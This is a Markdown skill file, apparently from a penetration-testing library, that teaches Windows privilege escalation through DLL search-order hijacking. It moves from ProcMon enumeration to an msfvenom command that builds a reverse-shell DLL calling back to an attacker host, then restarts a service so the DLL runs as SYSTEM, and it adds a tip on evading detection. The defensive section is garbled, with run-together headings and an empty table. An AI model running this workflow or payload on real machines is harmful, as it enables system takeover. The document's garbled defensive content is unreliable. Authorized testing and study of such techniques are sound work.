---
name: dll-hijacking-privesc
description: >
  Exploit local systems via DLL load order hijacking. This skill details how to identify 
  applications on Windows that insecurely load Dynamic Link Libraries (DLLs) and how to 
  substitute a legitimate DLL with a malicious one to achieve privilege escalation or persistent access.
domain: cybersecurity
subdomain: penetration-testing
category: Privilege Escalation
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0004, TA0003]
  techniques: [T1574.001]
platforms: [windows]
tags: [windows, privesc, dll-hijacking, local-privilege-escalation, procmon]
tools: [procmon, msfvenom]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# DLL Hijacking for Privilege Escalation

## When to Use
- During a Windows local privilege escalation phase.
- When an application running with elevated privileges (like a service) attempts to load a missing DLL, and the directory it parses is writable by the current low-privileged user.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Finding Missing DLLs (ProcMon)

You can find vulnerable processes using Sysinternals Process Monitor (ProcMon).

```text
# Concept: Filter ProcMon events 1. Open ProcMon and set the following filters:
   - "Result" is "NAME NOT FOUND"
   - "Path" ends with ".dll"
2. Start an application or restart a service.
3. Observe processes looking for DLLs that do not exist in their primary directories.
```

### Phase 2: Verifying Writable Directories

Once an application is observed attempting to load `missing.dll` in a path like `C:\Software\bin\missing.dll`, verify if your low-privileged user can write to `C:\Software\bin\`.

```powershell
# Check folder permissions using Access Control Lists (ACLs)
Get-Acl -Path "C:\Software\bin" | Format-List
# Look for "BUILTIN\Users: Allow Write" or similar rules.
```

### Phase 3: Crafting the Malicious DLL

Create a malicious DLL that replicates the needed payload (e.g., executing a reverse shell or adding a user to local admins).

```bash
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o missing.dll
```
*Note: Generating raw DLL payloads using C/C++ in Visual Studio is often preferred for evasion, ensuring `DllMain` attaches successfully.*

### Phase 4: Hijacking and Execution

1. Place the generated `missing.dll` into the writable application directory (`C:\Software\bin\`).
2. Trigger the application or service. If it is a service, you need the right to restart it (or reboot the machine if it starts on boot).

```powershell
# Restart-Service -Name VulnerableAppService
```

3. When the service starts (as `NT AUTHORITY\SYSTEM`), it blindly loads and executes your DLL.

#### Decision Point 🔀
```mermaid
flowchart TD
    A[ProcMon Enumeration ] --> B[Identify "NAME NOT FOUND" DLL ]
    B --> C{Directory Writable? }
    C -->|Yes| D[Craft Malicious DLL ]
    C -->|No| E[Check Next Target / Phantom DLLs ]
    D --> F[Place DLL in Path ]}
    F --> G[Reboot or Restart Service ]
    G --> H[Payload Executes as System ]
```

## 🔵 Blue Team Detection & Defense
- **Enforce Safe DLL Search Mode**: **Strict Directory Permissions**: **Code Signing Integrity**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Dll Hijacking Privesc — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Mitre ATT&CK: [Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- WADComs: [DLL Hijacking](https://wadcoms.github.io/wadcoms/Procmon-DLL-Hijacking/)
